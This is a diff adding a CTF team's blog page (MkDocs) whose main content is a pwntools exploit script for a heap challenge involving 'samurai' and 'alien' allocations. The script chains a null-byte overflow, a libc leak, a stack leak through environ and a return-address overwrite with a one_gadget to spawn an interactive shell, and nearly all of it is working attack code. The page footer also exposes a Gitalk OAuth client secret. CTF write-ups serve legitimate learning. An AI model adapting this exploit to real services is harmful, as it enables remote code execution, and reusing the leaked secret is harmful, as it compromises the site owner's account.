+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--debugger&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--port&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;--remote&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-e&#39;</span><span class="p">,</span> <span class="s1">&#39;--elf&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-b&#39;</span><span class="p">,</span> <span class="s1">&#39;--binary&#39;</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;/bin/bash&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span> <span class="c1"># this is a brute wew</span>
+<span class="c1"># context.binary = args.binary # this just hangs???</span>
+
+
+<span class="n">p</span> <span class="o">=</span> <span class="bp">None</span> <span class="c1"># this is global process variable</span>
+<span class="n">e</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="n">b</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">elf</span><span class="p">:</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">elf</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">remote</span><span class="p">:</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)</span> <span class="c1"># TODO: add a remote service URI here</span>
+<span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">binary</span><span class="p">:</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">binary</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
+  <span class="nb">exit</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">debugger</span><span class="p">:</span>
+  <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">remote</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;You can&#39;t attach a debugger to a remote process&quot;</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="c1"># if in vagrant just run gdb and attach it.</span>
+
+
+<span class="c1"># TODO: Setup enough samurais to beat the final alien</span>
+
+<span class="k">def</span> <span class="nf">create_sam</span><span class="p">():</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ka?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">kill_sam</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ka?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;daimyo?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">SAMURAIS</span> <span class="o">=</span> <span class="mi">40</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">SAMURAIS</span><span class="p">):</span>
+  <span class="n">create_sam</span><span class="p">()</span>
+
+<span class="c1"># we make room for aliens in the heap to exist.</span>
+<span class="n">unkillable</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">16</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">unkillable</span><span class="p">)):</span>
+  <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">unkillable</span><span class="p">:</span> <span class="k">continue</span>
+  <span class="n">kill_sam</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ka?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+
+<span class="c1"># TODO: Alien =&gt; alien =&gt; libc leak</span>
+<span class="k">def</span> <span class="nf">create_alien</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;today.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">kill_alien</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;today.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;mother?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">rename_alien</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;today.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;rename?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;to?&#39;</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 0 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mh">0x1f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x210</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># 1 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;C&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 2 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;D&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1">#3</span>
+
+
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># kill and overwrite to overflow</span>
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;E&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 4 =&gt; overflows and misaligns C&#39;s prev_size field.</span>
+
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;F&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 5 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">&#39;G&#39;</span> <span class="o">*</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="c1"># 6</span>
+
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;H&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 7</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">&#39;I&#39;</span> <span class="o">*</span> <span class="mh">0x79</span><span class="p">)</span> <span class="c1"># 8 killed</span>
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;today.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;rename?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="c1"># rename the libc leak</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;rename &#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;to?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39; to?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;LEAK: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
+<span class="n">main_arena_plus_88</span> <span class="o">=</span> <span class="mh">0x3c4b78</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">main_arena_plus_88</span>
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+<span class="n">environ</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x45216</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;J&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 9 to reset the heap</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 10 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x1f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x210</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># 11 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 12 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1">#13</span>
+
+
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="c1"># kill and overwrite to overflow</span>
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 14 =&gt; overflows and misaligns C&#39;s prev_size field.</span>
+
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span> <span class="o">*</span> <span class="mh">0xf7</span><span class="p">)</span> <span class="c1"># 15 killed</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span> <span class="o">*</span> <span class="mh">0x1ff</span><span class="p">)</span> <span class="c1"># 16 this will be stuck into the &quot;modified&quot; position DO NOT KILL</span>
+
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;h&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x9</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">create_alien</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># 17</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;today.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;rename?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;rename</span><span class="se">\x20</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; to?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39; to?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;Environ: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span>
+
+<span class="n">kill_alien</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
+
+<span class="n">ret_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">336</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Return address overwrite:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span> <span class="o">+</span> <span class="n">ret_offset</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;h&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_leak</span> <span class="o">+</span> <span class="n">ret_offset</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x9</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">create_alien</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># 18 in 17&#39;s place</span>
+
+<span class="n">rename_alien</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="c1"># print(&quot;Puts (for reference): &quot; + hex(libc_base + e.symbols[&#39;puts&#39;]))</span>
+<span class="c1"># print(&#39;Free hook: &#39; + hex(free_hook))</span>
+<span class="c1"># print(&#39;One Gadget: &#39; + hex(one_gadget))</span>
+<span class="c1"># pause()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+                
+                  
+                
+              
+              
+                <!-- Set from config but allow override -->
+   
+
+<hr>
+
+<!-- Comments Integration -->
+ 
+<h2 id="__comments">评论</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '708ce3b6562eb67f799f',
+        clientSecret: 'fa962a493d91e7d25852c1562cf3972825e0767e',
+        repo: 'blog_comment',
+        owner: 'DF-11A',
+        admin: ['4uuu', 'DF-11A'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script> 
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2016 - 2018 DF Team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.a26c1c19.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      
+        <script src="../../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+        <script src="../../../../search/main.js"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
